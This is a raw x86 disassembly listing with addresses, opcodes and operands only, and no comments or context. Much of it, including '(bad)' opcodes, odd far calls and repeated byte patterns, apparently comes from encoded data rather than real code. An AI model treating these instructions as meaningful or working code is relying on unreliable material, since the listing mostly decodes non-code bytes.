  432598:	bound  esp,QWORD PTR [edx+0xd]
  43259b:	loop   0x4325f2
  43259d:	pop    esp
  43259e:	bound  esp,QWORD PTR [edx-0x7b]
  4325a1:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4325a7:	call   0x13508754
  4325ac:	popa   
  4325ad:	arpl   WORD PTR [edx+0x62],sp
  4325b0:	xchg   ebx,eax
  4325b1:	mov    edx,0x50e20d60
  4325b6:	pop    esp
  4325b7:	bound  esp,QWORD PTR [edx+0xd]
  4325ba:	in     al,0x28
  4325bc:	pop    esp
  4325bd:	bound  esp,QWORD PTR [edx+0x1a]
  4325c0:	xchg   BYTE PTR [eax-0x1df265fc],dl
  4325c6:	push   ebp
  4325c7:	pop    esp
  4325c8:	bound  esp,QWORD PTR [edx-0x7b]
  4325cb:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4325d1:	call   0x1350877e
  4325d6:	popa   
  4325d7:	arpl   WORD PTR [edx+0x62],sp
  4325da:	xchg   ebx,eax
  4325db:	mov    edx,0x5de20d60
  4325e0:	pop    esp
  4325e1:	bound  esp,QWORD PTR [edx-0x7b]
  4325e4:	or     ebx,DWORD PTR [edx-0x1da9c537]
  4325ea:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  4325ee:	xchg   ebx,eax
  4325ef:	push   es
  4325f0:	outs   dx,BYTE PTR ds:[esi]
  4325f1:	call   0x130d:0x61a8e85e
  4325f8:	fs pop esp
  4325fa:	bound  esp,QWORD PTR [edx-0x2a]
  4325fd:	outs   dx,DWORD PTR ds:[esi]
  4325fe:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432604:	call   0x693:0x61a8e85e
  43260b:	adc    ecx,DWORD PTR [ecx+0x5c]
  43260e:	bound  esp,QWORD PTR [edx-0x51]
  432611:	pusha  
  432612:	add    al,0x13
  432614:	dec    ecx
  432615:	pop    esp
  432616:	bound  esp,QWORD PTR [edx+0x1a]
  432619:	loop   0x432664
  43261b:	pop    esp
  43261c:	bound  esp,QWORD PTR [edx+0xd]
  43261f:	adc    edx,DWORD PTR [ebp+0x5c]
  432622:	bound  esp,QWORD PTR [edx-0x2a]
  432625:	outs   dx,DWORD PTR ds:[esi]
  432626:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43262c:	pop    esi
  43262d:	call   0xe45087da
  432632:	popa   
  432633:	arpl   WORD PTR [edx+0x62],sp
  432636:	xchg   ebx,eax
  432637:	mov    edx,0x28130d4f
  43263c:	pop    esp
  43263d:	bound  esp,QWORD PTR [edx+0x4]
  432640:	test   DWORD PTR [ecx+0x5c55e20d],0xb856262
  43264a:	call   0xa8e8:0x5e343ac9
  432651:	popa   
  432652:	or     eax,0x62636113
  432657:	bound  edx,QWORD PTR [ebx-0x1df29f46]
  43265d:	push   eax
  43265e:	pop    esp
  43265f:	bound  esp,QWORD PTR [edx+0xd]
  432662:	in     al,0x28
  432664:	pop    esp
  432665:	bound  esp,QWORD PTR [edx+0x1a]
  432668:	xchg   BYTE PTR [eax-0x1df265fc],dl
  43266e:	push   ebp
  43266f:	pop    esp
  432670:	bound  esp,QWORD PTR [edx-0x7b]
  432673:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432679:	call   0x13508826
  43267e:	popa   
  43267f:	arpl   WORD PTR [edx+0x62],sp
  432682:	xchg   ebx,eax
  432683:	mov    edx,0x48e20d60
  432688:	pop    esp
  432689:	bound  esp,QWORD PTR [edx-0x7b]
  43268c:	or     ebx,DWORD PTR [edx-0x1da9c537]
  432692:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  432696:	xchg   ebx,eax
  432697:	push   es
  432698:	outs   dx,BYTE PTR ds:[esi]
  432699:	call   0x130d:0x61a8e85e
  4326a0:	mul    DWORD PTR [ebx+0x62]
  4326a3:	(bad)  
  4326a4:	(bad)  
  4326a5:	outs   dx,DWORD PTR ds:[esi]
  4326a6:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4326ac:	call   0x693:0x61a8e85e
  4326b3:	adc    ecx,DWORD PTR [ecx+0x5c]
  4326b6:	bound  esp,QWORD PTR [edx-0x51]
  4326b9:	pusha  
  4326ba:	add    al,0x13
  4326bc:	dec    ecx
  4326bd:	pop    esp
  4326be:	bound  esp,QWORD PTR [edx+0x1a]
  4326c1:	loop   0x43270c
  4326c3:	pop    esp
  4326c4:	bound  esp,QWORD PTR [edx+0xd]
  4326c7:	adc    edx,DWORD PTR [ebp+0x5c]
  4326ca:	bound  esp,QWORD PTR [edx-0x2a]
  4326cd:	outs   dx,DWORD PTR ds:[esi]
  4326ce:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4326d4:	pop    esi
  4326d5:	call   0xe4508882
  4326da:	popa   
  4326db:	arpl   WORD PTR [edx+0x62],sp
  4326de:	xchg   ebx,eax
  4326df:	mov    edx,0x28130d4f
  4326e4:	pop    esp
  4326e5:	bound  esp,QWORD PTR [edx+0x4]
  4326e8:	test   DWORD PTR [ecx+0x5c48e20d],0xb856262
  4326f2:	call   0xa8e8:0x5e343ac9
  4326f9:	popa   
  4326fa:	or     eax,0x625c6913
  4326ff:	(bad)  
  432700:	(bad)  
  432701:	outs   dx,DWORD PTR ds:[esi]
  432702:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432708:	pop    esi
  432709:	call   0xbad688b6
  43270e:	pop    ds
  43270f:	push   esi
  432710:	loop   0x432773
  432712:	arpl   WORD PTR [edx+0x62],sp
  432715:	pop    ss
  432716:	loop   0x432779
  432718:	arpl   WORD PTR [edx+0x62],sp
  43271b:	lock sub al,0x63
  43271e:	bound  esp,QWORD PTR [edx+0xd]
  432721:	loop   0x4326b5
  432723:	arpl   WORD PTR [edx+0x62],sp
  432726:	test   DWORD PTR [ebx],ecx
  432728:	call   0x5cf3:0x130d3ac9
  43272f:	bound  esp,QWORD PTR [edx-0x2a]
  432732:	outs   dx,DWORD PTR ds:[esi]
  432733:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432739:	pop    esi
  43273a:	call   0xe45088e7
  43273f:	pop    eax
  432740:	pop    esp
  432741:	bound  esp,QWORD PTR [edx+0xd]
  432744:	or     ecx,DWORD PTR [eax+0x5c]
  432747:	bound  esp,QWORD PTR [edx-0x2a]
  43274a:	dec    ebx
  43274b:	or     ebx,DWORD PTR [edx-0x29c537]
  432751:	pop    esi
  432752:	call   0xbad688ff
  432757:	xchg   di,ax
  432759:	outs   dx,DWORD PTR ds:[esi]
  43275a:	adc    ebp,DWORD PTR [esi+0x3b]
  43275d:	pop    esi
  43275e:	call   0x1350890b
  432763:	xchg   edx,eax
  432764:	arpl   WORD PTR [edx+0x62],sp
  432767:	(bad)  
  432768:	outs   dx,DWORD PTR ds:[esi]
  432769:	or     ebx,DWORD PTR [edx+0x13563ac9]
  43276f:	sti    
  432770:	arpl   WORD PTR [edx+0x62],sp
  432773:	adc    ebp,DWORD PTR [esi+0x68]
  432776:	pop    esi
  432777:	call   0xe25a8924
  43277c:	sti    
  43277d:	arpl   WORD PTR [edx+0x62],sp
  432780:	out    dx,al
  432781:	jl     0x432790
  432783:	loop   0x432717
  432785:	arpl   WORD PTR [edx+0x62],sp
  432788:	test   DWORD PTR [ebx],ecx
  43278a:	call   0x63fb:0x130d3ac9
  432791:	bound  esp,QWORD PTR [edx+0x13]
  432794:	outs   dx,BYTE PTR ds:[esi]
  432795:	push   0x61a8e85e
  43279a:	pop    ss
  43279b:	loop   0x432798
  43279d:	arpl   WORD PTR [edx+0x62],sp
  4327a0:	lock jno 0x4327f8
  4327a3:	bound  esp,QWORD PTR [edx+0x62]
  4327a6:	mov    dl,0x24
  4327a8:	or     eax,0xad622475
  4327ad:	dec    esp
  4327ae:	push   0x75136161
  4327b3:	and    dl,dl
  4327b5:	or     eax,0xdb0d2475
  4327ba:	stc    
  4327bb:	push   0x72626161
  4327c0:	or     eax,0xdb0d2475
  4327c5:	sbb    al,0x68
  4327c7:	popa   
  4327c8:	popa   
  4327c9:	bound  esi,QWORD PTR [edx+0x62]
  4327cc:	mov    dl,0x5d
  4327ce:	bound  ecx,QWORD PTR [ebx]
  4327d0:	into   
  4327d1:	bound  esp,QWORD PTR [edx+0x62]
  4327d4:	repz inc edi
  4327d6:	jbe    0x432839
  4327d8:	popa   
  4327d9:	pop    ss
  4327da:	jne    0x4327f0
  4327dc:	or     eax,0x62627ae2
  4327e1:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4327e7:	xor    al,0x5e
  4327e9:	call   0xe2ea8996
  4327ee:	into   
  4327ef:	bound  esp,QWORD PTR [edx+0x62]
  4327f2:	out    0xa9,eax
  4327f4:	or     eax,0xb851c75
  4327f9:	call   0xa8e8:0x5e343ac9
  432800:	popa   
  432801:	ror    BYTE PTR ds:0x62627ae2,cl
  432807:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43280d:	xor    al,0x5e
  43280f:	call   0x631589bc
  432814:	or     ecx,esi
  432816:	bound  esp,QWORD PTR [edx+0x62]
  432819:	or     eax,0xdb0d2475
  43281e:	dec    eax
  43281f:	push   0xd2626161
  432824:	mov    al,bl
  432826:	mov    esp,0x61f72257
  43282b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43282c:	or     eax,0x13c9c964
  432831:	jne    0x432888
  432833:	pop    ss
  432834:	jne    0x43289f
  432836:	or     eax,0x61216975
  43283b:	pushf  
  43283c:	xchg   edi,eax
  43283d:	mov    ah,0x69
  43283f:	(bad)  
  432840:	jmp    0xb269:0xb4979c55
  432847:	mov    WORD PTR ds:0xa2ff9275,cs
  43284d:	call   0xa2ff:0x86750df3
  432854:	push   0x92750d36
  432859:	jmp    DWORD PTR [edx+0x22576434]
  43285f:	xchg   BYTE PTR [ecx-0x5b],ah
  432862:	or     eax,0xfd64d664
  432867:	popa   
  432868:	popa   
  432869:	popa   
  43286a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43286b:	and    DWORD PTR [ebp+0x8],esi
  43286e:	lods   eax,DWORD PTR ds:[esi]
  43286f:	loop   0x432872
  432871:	imul   esp,DWORD PTR [ecx],0xe2252475
  432877:	add    DWORD PTR [ecx+0xd],ebp
  43287a:	jne    0x4328fa
  43287c:	pop    ss
  43287d:	jne    0x43289b
  43287f:	or     eax,0xdb0d1c75
  432884:	or     al,0x68
  432886:	popa   
  432887:	popa   
  432888:	or     eax,0x170d1ccd
  43288d:	or     al,0x68
  43288f:	popa   
  432890:	popa   
  432891:	or     eax,0x56610d91
  432896:	cdq    
  432897:	xchg   esi,eax
  432898:	pop    ss
  432899:	jne    0x432894
  43289b:	or     eax,0xb850875
  4328a0:	call   0xa8e8:0x5e343ac9
  4328a7:	popa   
  4328a8:	pop    ss
  4328a9:	jne    0x4328ff
  4328ab:	or     eax,0xb850875
  4328b0:	call   0xa8e8:0x5e343ac9
  4328b7:	popa   
  4328b8:	pop    ss
  4328b9:	jne    0x432924
  4328bb:	or     eax,0xa20df975
  4328c0:	rcr    al,cl
  4328c2:	xrelease xchg BYTE PTR [edi],dl
  4328c5:	jne    0x432924
  4328c7:	or     eax,0xa20df975
  4328cc:	stos   BYTE PTR es:[edi],al
  4328cd:	fimul  DWORD PTR ds:0x997ff9cd
  4328d3:	mov    esi,0x750d7de7
  4328d8:	stc    
  4328d9:	or     eax,0x4adaaaa2
  4328de:	pop    eax
  4328df:	or     eax,0x997ff9cd
  4328e4:	mov    esi,0x56f9cd0d
  4328e9:	cdq    
  4328ea:	stos   BYTE PTR es:[edi],al
  4328eb:	pop    ss
  4328ec:	loop   0x4328bc
  4328ee:	bound  esp,QWORD PTR [edx+0x62]
  4328f1:	out    dx,al
  4328f2:	xchg   BYTE PTR ds:0xa20df975,cl
  4328f8:	mov    esi,0x62cee217
  4328fd:	bound  esp,QWORD PTR [edx+0xd]
  432900:	loop   0x4328d0
  432902:	bound  esp,QWORD PTR [edx+0x62]
  432905:	pop    ss
  432906:	jne    0x4328b9
  432908:	or     eax,0xb850875
  43290d:	call   0xa8e8:0x5e343ac9
  432914:	popa   
  432915:	pop    ss
  432916:	jne    0x43292c
  432918:	or     eax,0xb850875
  43291d:	call   0xa8e8:0x5e343ac9
  432924:	popa   
  432925:	pop    ss
  432926:	jne    0x432988
  432928:	or     eax,0xb850875
  43292d:	call   0xa8e8:0x5e343ac9
  432934:	popa   
  432935:	or     eax,0x681792cd
  43293a:	and    DWORD PTR [ebp-0x53],esi
  43293d:	and    eax,0x216901e2
  432942:	jne    0x432999
  432944:	mov    bl,0xe2
  432946:	add    DWORD PTR [ecx+0x21],ebp
  432949:	jne    0x432997
  43294b:	and    esp,edx
  43294d:	add    DWORD PTR [ecx+0x21],ebp
  432950:	jne    0x432972
  432952:	and    dl,ah
  432954:	add    DWORD PTR [ecx+0xd],ebp
  432957:	jne    0x43297d
  432959:	test   DWORD PTR [ebx],ecx
  43295b:	call   0xa8e8:0x5e343ac9
  432962:	popa   
  432963:	or     eax,0xba93b1cd
  432968:	pusha  
  432969:	or     eax,0xb850875
  43296e:	call   0x135d:0xa50d3ac9
  432975:	outs   dx,BYTE PTR ds:[esi]
  432976:	xchg   edx,eax
  432977:	pop    esi
  432978:	call   0x60ea8b25
  43297d:	xchg   ebx,eax
  43297e:	fdiv   st,st(3)
  432980:	mul    DWORD PTR [ecx+0x61]
  432983:	or     eax,0xb850875
  432988:	call   0xa8e8:0x5e343ac9
  43298f:	popa   
  432990:	pop    ss
  432991:	jne    0x4329fc
  432993:	or     eax,0x75568675
  432998:	mov    cl,0x17
  43299a:	jne    0x4329f0
  43299c:	bound  esi,QWORD PTR [edx-0x794d9dac]
  4329a2:	bound  esi,QWORD PTR [edx-0x2a270c07]
  4329a8:	popa   
  4329a9:	popa   
  4329aa:	pop    ss
  4329ab:	jne    0x4329ae
  4329ad:	and    edx,esp
  4329af:	fbld   TBYTE PTR [edx+0x62]
  4329b2:	bound  edx,QWORD PTR [edx+eiz*8]
  4329b5:	add    DWORD PTR [ecx+0xd],ebp
  4329b8:	loop   0x432999
  4329ba:	bound  esp,QWORD PTR [edx+0x62]
  4329bd:	test   DWORD PTR [ebx],ecx
  4329bf:	call   0xa8e8:0x5e343ac9
  4329c6:	popa   
  4329c7:	rcl    BYTE PTR [ebx],cl
  4329c9:	jne    0x4329a6
  4329cb:	shl    bl,cl
  4329cd:	cli    
  4329ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4329cf:	popa   
  4329d0:	popa   
  4329d1:	fsubr  st,st(2)
  4329d3:	add    DWORD PTR [ecx-0x19],esp
  4329d6:	out    0xd,al
  4329d8:	loop   0x4329b9
  4329da:	bound  esp,QWORD PTR [edx+0x62]
  4329dd:	test   DWORD PTR [ebx],ecx
  4329df:	call   0xa8e8:0x5e343ac9
  4329e6:	popa   
  4329e7:	shl    BYTE PTR [edx-0x4e],cl
  4329ea:	add    DWORD PTR [ebx],edx
  4329ec:	jne    0x4329c9
  4329ee:	shl    bl,cl
  4329f0:	jae    0x432a1f
  4329f2:	popa   
  4329f3:	popa   
  4329f4:	or     eax,0xe2175475
  4329f9:	out    0x62,al
  4329fb:	bound  esp,QWORD PTR [edx+0xd]
  4329fe:	jne    0x432986
  432a00:	or     eax,0x6262e613
  432a05:	bound  ebp,QWORD PTR ds:0xe6131760
  432a0b:	bound  esp,QWORD PTR [edx+0x62]
  432a0e:	or     eax,0x6262e6e2
  432a13:	bound  ecx,QWORD PTR ds:0xd10d01cd
  432a19:	xchg   BYTE PTR ds:0xd05601a5,cl
  432a1f:	xchg   edx,eax
  432a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432a21:	pop    ds
  432a22:	call   0x1b837aa
  432a27:	or     eax,0xcd0d86a2
  432a2c:	add    DWORD PTR [esi-0x67],edx
  432a2f:	call   0x6262:0x62e6130d
  432a36:	sub    eax,0xb175561f
  432a3b:	pop    ss
  432a3c:	jne    0x4329ef
  432a3e:	lock (bad) 
  432a40:	bound  esp,QWORD PTR [edx+0x62]
  432a43:	jo     0x4329cb
  432a45:	bound  esi,QWORD PTR [edx-0xc8aecac]
  432a4b:	shl    bl,cl
  432a4d:	push   0x2d
  432a4f:	popa   
  432a50:	popa   
  432a51:	and    edx,esp
  432a53:	jmp    0x432ab7
  432a55:	bound  esp,QWORD PTR [edx-0x53]
  432a58:	loop   0x432a5b
  432a5a:	imul   esp,DWORD PTR [ecx],0x6262e7e2
  432a60:	bound  esp,QWORD PTR ds:0x216901e2
  432a66:	jne    0x432a65
  432a68:	mov    bl,0xe2
  432a6a:	add    DWORD PTR [ecx+0x21],ebp
  432a6d:	jne    0x432a7b
  432a6f:	and    esp,edx
  432a71:	add    DWORD PTR [ecx+0x13],ebp
  432a74:	loop   0x432a61
  432a76:	bound  esp,QWORD PTR [edx+0x62]
  432a79:	pop    ss
  432a7a:	jne    0x432a80
  432a7c:	adc    esp,edx
  432a7e:	out    0x62,eax
  432a80:	bound  esp,QWORD PTR [edx+0x17]
  432a83:	loop   0x432a68
  432a85:	bound  esp,QWORD PTR [edx+0x62]
  432a88:	adc    esi,DWORD PTR [ebp-0x3]
  432a8b:	pop    ss
  432a8c:	jne    0x432a77
  432a8e:	adc    esi,DWORD PTR [ebp+0xc]
  432a91:	pop    ss
  432a92:	jne    0x432a89
  432a94:	or     eax,0xb850875
  432a99:	call   0xa8e8:0x5e343ac9
  432aa0:	popa   
  432aa1:	pop    ss
  432aa2:	jne    0x432ab4
  432aa4:	and    edx,esp
  432aa6:	jp     0x432b0a
  432aa8:	bound  esp,QWORD PTR [edx-0x53]
  432aab:	loop   0x432aae
  432aad:	imul   ebp,esi,0x7ae20dd4
  432ab3:	bound  esp,QWORD PTR [edx+0x62]
  432ab6:	test   DWORD PTR [ebx],ecx
  432ab8:	call   0xd624:0xcd0d3ac9
  432abf:	outs   dx,DWORD PTR ds:[esi]
  432ac0:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432ac6:	call   0xb85:0x61a8e85e
  432acd:	call   0x627a:0xe2173ac9
  432ad4:	bound  esp,QWORD PTR [edx+0xd]
  432ad7:	jne    0x432b42
  432ad9:	or     eax,0x6fd608cd
  432ade:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432ae4:	pop    esi
  432ae5:	call   0x1fea8c92
  432aea:	xchg   ebx,eax
  432aeb:	loop   0x432aa8
  432aed:	pop    edi
  432aee:	popa   
  432aef:	popa   
  432af0:	(bad)  
  432af1:	and    edi,DWORD PTR [edx+0x62]
  432af4:	bound  esp,QWORD PTR [edx-0x4d]
  432af7:	loop   0x432afa
  432af9:	imul   edx,DWORD PTR [ebx+0x615f0a6e],0x24750d61
  432b03:	test   DWORD PTR [ebx],ecx
  432b05:	call   0xa8e8:0x5e343ac9
  432b0c:	popa   
  432b0d:	pop    ss
  432b0e:	jne    0x432b79
  432b10:	or     eax,0x62627ae2
  432b15:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  432b1b:	or     eax,0x6e1310cd
  432b20:	push   0x61a8e85e
  432b25:	pop    ss
  432b26:	jne    0x432b38
  432b28:	or     eax,0xcd0d1075
  432b2d:	and    al,0xd6
  432b2f:	outs   dx,DWORD PTR ds:[esi]
  432b30:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432b36:	pop    esi
  432b37:	call   0x1fea8ce4
  432b3c:	mov    dl,0x81
  432b3e:	or     eax,0xb850875
  432b43:	call   0xa8e8:0x5e343ac9
  432b4a:	popa   
  432b4b:	shl    BYTE PTR [eax-0x7a],cl
  432b4e:	adc    esi,DWORD PTR [ebp-0xd]
  432b51:	shl    bl,cl
  432b53:	call   0x475:0xd62623f
  432b5a:	or     eax,0x9a0b8561
  432b5f:	leave  
  432b60:	cmp    dl,BYTE PTR [ebx+0x35346e06]
  432b66:	call   0xcd508d13
  432b6b:	or     dh,dl
  432b6d:	outs   dx,DWORD PTR ds:[esi]
  432b6e:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432b74:	pop    esi
  432b75:	call   0x1fea8d22
  432b7a:	out    0xe8,eax
  432b7c:	or     eax,0x6262e3e2
  432b81:	bound  ecx,QWORD PTR ds:0x9a0b8561
  432b87:	leave  
  432b88:	cmp    dl,BYTE PTR [ebx+0x35346e06]
  432b8e:	call   0xcd508d3b
  432b93:	or     dh,dl
  432b95:	outs   dx,DWORD PTR ds:[esi]
  432b96:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432b9c:	pop    esi
  432b9d:	call   0x1fea8d4a
  432ba2:	out    0xd0,eax
  432ba4:	or     eax,0x610de975
  432ba9:	test   DWORD PTR [ebx],ecx
  432bab:	call   0x346e:0x6933ac9
  432bb2:	xor    eax,0xd61a8e8
  432bb7:	int    0x8
  432bb9:	(bad)  
  432bba:	outs   dx,DWORD PTR ds:[esi]
  432bbb:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432bc1:	pop    esi
  432bc2:	call   0x1fea8d6f
  432bc7:	out    0xd5,eax
  432bc9:	or     eax,0x610df575
  432bce:	test   DWORD PTR [ebx],ecx
  432bd0:	call   0x346e:0x6933ac9
  432bd7:	xor    eax,0xd61a8e8
  432bdc:	int    0x8
  432bde:	(bad)  
  432bdf:	outs   dx,DWORD PTR ds:[esi]
  432be0:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432be6:	pop    esi
  432be7:	call   0x1fea8d94
  432bec:	mov    dl,0x6b
  432bee:	or     eax,0xb850875
  432bf3:	call   0xa8e8:0x5e343ac9
  432bfa:	popa   
  432bfb:	pop    ss
  432bfc:	jne    0x432c67
  432bfe:	lock adc ch,BYTE PTR [eax+0x61]
  432c02:	popa   
  432c03:	or     eax,0x610d0475
  432c08:	test   DWORD PTR [ebx],ecx
  432c0a:	call   0x346e:0x6933ac9
  432c11:	ret    0xa8e8
  432c14:	popa   
  432c15:	or     eax,0x910de9cd
  432c1a:	(bad)  
  432c1b:	outs   dx,DWORD PTR ds:[esi]
  432c1c:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432c22:	adc    BYTE PTR [ebp+0x61a8e835],cl
  432c28:	or     eax,0x880d04a5
  432c2d:	(bad)  
  432c2e:	or     bx,WORD PTR [edx+0x6933ac9]
  432c35:	jmp    0xa92b61a5
  432c3a:	popa   
  432c3b:	or     eax,0x6262e30b
  432c40:	bound  ecx,QWORD PTR ds:0xb4bd684
  432c46:	call   0x8508:0x6933ac9
  432c4d:	xor    eax,0xaf61a8e8
  432c52:	es xchg edi,eax
  432c54:	dec    esi
  432c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432c56:	pop    ds
  432c57:	xchg   ebx,eax
  432c58:	loop   0x432c95
  432c5a:	push   0xe20d6161
  432c5f:	jecxz  0x432cc3
  432c61:	bound  esp,QWORD PTR [edx+0xd]
  432c64:	popa   
  432c65:	test   DWORD PTR [ebx],ecx
  432c67:	call   0x346e:0x6933ac9
  432c6e:	ret    0xa8e8
  432c71:	popa   
  432c72:	or     eax,0x910df5cd
  432c77:	(bad)  
  432c78:	outs   dx,DWORD PTR ds:[esi]
  432c79:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432c7f:	adc    BYTE PTR [ebp+0x61a8e835],cl
  432c85:	or     eax,0x6262e3e4
  432c8a:	bound  ecx,QWORD PTR ds:0xb66d688
  432c90:	call   0x6be9:0x6933ac9
  432c97:	xor    eax,0xd61a8e8
  432c9c:	mov    dl,0xe9
  432c9e:	or     eax,0xb4bd684
  432ca3:	call   0x8508:0x6933ac9
  432caa:	xor    eax,0xaf61a8e8
  432caf:	es xchg edi,eax
  432cb1:	dec    esi
  432cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432cb3:	pop    ds
  432cb4:	xchg   ebx,eax
  432cb5:	loop   0x432c67
  432cb7:	popa   
  432cb8:	popa   
  432cb9:	popa   
  432cba:	or     eax,0x610de975
  432cbf:	test   DWORD PTR [ebx],ecx
  432cc1:	call   0x346e:0x6933ac9
  432cc8:	ret    0xa8e8
  432ccb:	popa   
  432ccc:	or     eax,0x910d04cd
  432cd1:	(bad)  
  432cd2:	outs   dx,DWORD PTR ds:[esi]
  432cd3:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432cd9:	adc    BYTE PTR [ebp+0x61a8e835],cl
  432cdf:	or     eax,0x880de9a5
  432ce4:	(bad)  
  432ce5:	or     bx,WORD PTR [edx+0x6933ac9]
  432cec:	jmp    0xa92b625c
  432cf1:	popa   
  432cf2:	or     eax,0x840df5b2
  432cf7:	(bad)  
  432cf8:	dec    ebx
  432cf9:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432cff:	or     BYTE PTR [ebp+0x61a8e835],al
  432d05:	scas   eax,DWORD PTR es:[edi]
  432d06:	es xchg edi,eax
  432d08:	dec    esi
  432d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d0a:	pop    ds
  432d0b:	mov    dl,0xa4
  432d0d:	or     eax,0x610df575
  432d12:	test   DWORD PTR [ebx],ecx
  432d14:	call   0x346e:0x6933ac9
  432d1b:	ret    0xa8e8
  432d1e:	popa   
  432d1f:	or     eax,0x6262e313
  432d24:	bound  ecx,QWORD PTR ds:0xb6fd691
  432d2a:	call   0x8d10:0x6933ac9
  432d31:	xor    eax,0xd61a8e8
  432d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432d37:	cmc    
  432d38:	or     eax,0xb66d688
  432d3d:	call   0x6be9:0x6933ac9
  432d44:	xor    eax,0xd61a8e8
  432d49:	mov    dl,0x4
  432d4b:	or     eax,0xb4bd684
  432d50:	call   0x8508:0x6933ac9
  432d57:	xor    eax,0xaf61a8e8
  432d5c:	es xchg edi,eax
  432d5e:	dec    esi
  432d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d60:	pop    ds
  432d61:	out    0x88,eax
  432d63:	or     eax,0xb850875
  432d68:	call   0xa8e8:0x5e343ac9
  432d6f:	popa   
  432d70:	pop    ss
  432d71:	jne    0x432ddc
  432d73:	out    dx,al
  432d74:	sti    
  432d75:	jo     0x432d11
  432d77:	adc    esi,DWORD PTR [ebp-0xd]
  432d7a:	shl    bl,cl
  432d7c:	jno    0x432d27
  432d7e:	popa   
  432d7f:	popa   
  432d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d81:	jne    0x432db4
  432d83:	out    0x92,eax
  432d85:	or     eax,0xb850875
  432d8a:	call   0xa8e8:0x5e343ac9
  432d91:	popa   
  432d92:	pop    ss
  432d93:	jne    0x432dfe
  432d95:	lock push 0x5c
  432d98:	bound  esp,QWORD PTR [edx+0xd]
  432d9b:	jne    0x432e06
  432d9d:	or     eax,0x6fd608cd
  432da2:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432da8:	pop    esi
  432da9:	call   0x1fea8f56
  432dae:	mov    dl,0x80
  432db0:	or     eax,0xb852475
  432db5:	call   0x13b1:0xcd0d3ac9
  432dbc:	outs   dx,BYTE PTR ds:[esi]
  432dbd:	push   0x61a8e85e
  432dc2:	pop    ss
  432dc3:	jne    0x432d76
  432dc5:	lock adc BYTE PTR [esi+0x62],bl
  432dc9:	bound  esi,QWORD PTR [eax-0x76]
  432dcc:	bound  esi,QWORD PTR [edx+0x58751354]
  432dd2:	shl    bl,cl
  432dd4:	sbb    DWORD PTR [edx],eax
  432dd6:	popa   
  432dd7:	popa   
  432dd8:	or     eax,0xb850875
  432ddd:	call   0xa8e8:0x5e343ac9
  432de4:	popa   
  432de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432de6:	jne    0x432df8
  432de8:	out    0x81,eax
  432dea:	or     eax,0xb850875
  432def:	call   0xa8e8:0x5e343ac9
  432df6:	popa   
  432df7:	shl    BYTE PTR [eax-0x76],cl
  432dfa:	adc    esi,DWORD PTR [ebp+0x58]
  432dfd:	shl    bl,cl
  432dff:	mov    dh,0x42
  432e01:	bound  esp,QWORD PTR [edx+0xd]
  432e04:	jne    0x432e5a
  432e06:	fcomp  DWORD PTR [edx+ecx*4]
  432e09:	pop    ss
  432e0a:	jne    0x432e20
  432e0c:	bound  esi,QWORD PTR [edx+0x14b26218]
  432e12:	or     eax,0x75569a75
  432e17:	dec    eax
  432e18:	shl    bl,cl
  432e1a:	rol    DWORD PTR [edx],1
  432e1c:	popa   
  432e1d:	popa   
  432e1e:	or     eax,0xb850875
  432e23:	call   0xa8e8:0x5e343ac9
  432e2a:	popa   
  432e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432e2c:	jne    0x432e3e
  432e2e:	out    0x89,eax
  432e30:	jo     0x432e93
  432e32:	bound  esi,QWORD PTR [edx-0x658af2e8]
  432e38:	push   esi
  432e39:	jne    0x432e83
  432e3b:	shl    bl,cl
  432e3d:	jl     0x432e81
  432e3f:	bound  esp,QWORD PTR [edx+0xd]
  432e42:	jne    0x432dd6
  432e44:	pop    ss
  432e45:	loop   0x432e87
  432e47:	bound  esp,QWORD PTR [edx+0x62]
  432e4a:	or     eax,0x626240e2
  432e4f:	bound  ecx,QWORD PTR ds:0x9a5618cd
  432e55:	or     eax,0x626240e2
  432e5a:	bound  edx,QWORD PTR [edi]
  432e5c:	call   0x1875:0x56b1750d
  432e63:	pop    ss
  432e64:	jne    0x432e17
  432e66:	lock out dx,al
  432e68:	bound  esp,QWORD PTR [bp+si+0xd]
  432e6c:	jne    0x432e08
  432e6e:	mov    esp,0x61922257
  432e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432e74:	or     eax,0x13c9c964
  432e79:	jne    0x432ed0
  432e7b:	pop    ss
  432e7c:	jne    0x432ee7
  432e7e:	or     eax,0x61216975
  432e83:	mov    eax,ds:0xd63a3b8c
